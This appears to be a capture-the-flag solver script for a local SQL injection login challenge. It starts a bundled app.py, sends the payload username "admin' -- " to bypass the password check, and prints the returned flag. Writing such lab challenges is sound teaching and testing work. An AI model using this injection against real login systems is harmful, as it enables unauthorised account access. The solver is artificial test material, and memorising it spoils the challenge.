#!/usr/bin/env python3
"""
Solver for sqli-login.

Attack: the login query is built via raw string formatting:

    SELECT * FROM users WHERE username = '{username}' AND password = '{password}'

Supplying username = admin' -- and any password comments out the password
check entirely, logging us in as admin without knowing the password.
"""
import os
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
BASE_URL = "http://127.0.0.1:5001"


def wait_for_server(base_url: str, timeout=10):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(base_url, timeout=1)
            return True
        except requests.exceptions.ConnectionError:
            time.sleep(0.2)
    return False


def solve(base_url=BASE_URL):
    payload = {
        "username": "admin' -- ",
        "password": "anything",
    }
    resp = requests.post(f"{base_url}/login", json=payload, timeout=5)
    resp.raise_for_status()
    data = resp.json()
    if "flag" not in data:
        raise RuntimeError(f"Attack failed, server said: {data}")
    return data["flag"]


def main():
    proc = subprocess.Popen(
        [sys.executable, os.path.join(HERE, "app.py")],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        if not wait_for_server(f"{BASE_URL}/"):
            out, err = proc.communicate(timeout=2)
            raise RuntimeError(f"server did not start: {err.decode()}")
        flag = solve()
        print(flag)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    main()
